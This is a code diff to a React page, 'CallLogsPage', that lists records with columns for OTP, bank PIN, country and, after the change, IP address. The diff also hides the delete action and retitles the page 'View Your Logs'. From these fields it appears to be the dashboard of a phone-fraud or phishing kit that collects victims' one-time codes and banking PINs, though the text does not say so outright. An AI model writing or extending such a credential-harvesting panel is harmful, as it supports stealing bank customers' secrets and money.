@@ -68,7 +68,7 @@ function CallLogsPage() {
         <Col xl={12}>
           <Card className="custom-card">
             <Card.Header className="justify-content-between">
-              <Card.Title>Call Logs</Card.Title>
+              <Card.Title>View Your Logs</Card.Title>
               <div className="d-flex flex-wrap gap-2">
                 <div className="flex justify-between gap-2">
                   <input
@@ -111,9 +111,9 @@ function CallLogsPage() {
                       <th>Otp</th>
                       <th>Bank Pin</th>
                       <th>Country Flag</th>
-                      <th>State</th>
+                      <th>IP Address</th>
                       <th>Date</th>
-                      <th>Action</th>
+                      {/* <th>Action</th> */}
                     </tr>
                   </thead>
                   <tbody>
@@ -158,7 +158,7 @@ function CallLogsPage() {
                               title={`${account?.location?.country}, ${account?.location?.city}`}
                             />
                           </td>
-                          <td>{account?.location?.region}</td>
+                          <td>{account?.location?.ipAddress}</td>
                           <td>
                             <div className="btn-list">
                               {moment(account.createdAt).format(
@@ -166,7 +166,7 @@ function CallLogsPage() {
                               )}
                             </div>
                           </td>
-                          <td>
+                          {/* <td>
                             <div className="btn-list">
                               <Button
                                 onClick={() => handleDeleteAccount(account)}
@@ -176,7 +176,7 @@ function CallLogsPage() {
                                 <Trash2 size={14} />
                               </Button>
                             </div>
-                          </td>
+                          </td> */}
                         </tr>
                       ))}
                   </tbody>
